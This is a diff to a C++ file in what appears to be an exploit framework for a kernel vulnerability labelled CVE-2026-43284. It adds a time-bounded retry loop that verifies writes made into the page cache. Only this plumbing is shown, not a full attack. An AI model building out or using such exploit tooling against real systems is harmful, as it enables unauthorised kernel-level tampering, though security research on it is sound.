@@ -1,6 +1,7 @@
 /** @file backend/cve_2026_43284/steps/pagecache_steps.cpp
  *  The block loop every image write shares. See the header for the boundary.
  */
+#include <chrono>
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
 
 #include "backend/cve_2026_43284/kernel_access.hpp"
@@ -226,11 +227,21 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 *refusal = message;
                 return false;
             }
-            const auto back = request.access->read(0U, request.width, request.channel, *request.params);
-            if (!back.ok() || back.value.size() != request.width ||
-                std::memcmp(back.value.data(), in, request.width) != 0) {
-                *refusal = kVerifyFailed;
-                return false;
+            /* 写是派发式的（成功只到 Dispatched）：落盘要等内核处理，所以这里做**有界重试**。
+             * 耐心由调用方给（request.budget_ms；0 = 不重试，与旧行为一致）—— 等多久是上层的事。 */
+            const auto verify_deadline = std::chrono::steady_clock::now() +
+                                         std::chrono::milliseconds(request.budget_ms);
+            for (;;) {
+                const auto back = request.access->read(0U, request.width, request.channel, *request.params);
+                if (back.ok() && back.value.size() == request.width &&
+                    std::memcmp(back.value.data(), in, request.width) == 0) {
+                    break;  /* landed：预算内比中 */
+                }
+                if (std::chrono::steady_clock::now() >= verify_deadline) {
+                    *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
+                    return false;
+                }
+                ::usleep(2000);  /* 一个轮询间隔（2 ms） */
             }
         }
         return true;
